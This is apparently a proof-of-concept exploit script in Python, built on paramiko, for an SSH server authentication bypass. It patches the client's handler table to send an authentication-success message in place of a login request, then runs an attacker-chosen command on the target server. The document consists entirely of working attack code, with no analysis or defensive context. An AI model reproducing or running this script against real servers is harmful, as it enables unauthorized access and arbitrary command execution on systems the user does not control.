import sys, paramiko, logging

new_auth_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_SUCCESS]

def auth_accept(*args, **kwargs): return new_auth_accept(*args, **kwargs)
 
paramiko.auth_handler.AuthHandler._handler_table.update({paramiko.common.MSG_USERAUTH_REQUEST: auth_accept,})

logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)

client = paramiko.SSHClient()

client.set_missing_host_key_policy(paramiko.WarningPolicy())

client.connect(sys.argv[1], port=int(sys.argv[2]), username=sys.argv[3], password="", pkey=None, key_filename=sys.argv[4])

command = sys.argv[5]

stdin, stdout, stderr = client.exec_command(command)

print(stdout.read(),)

client.close()
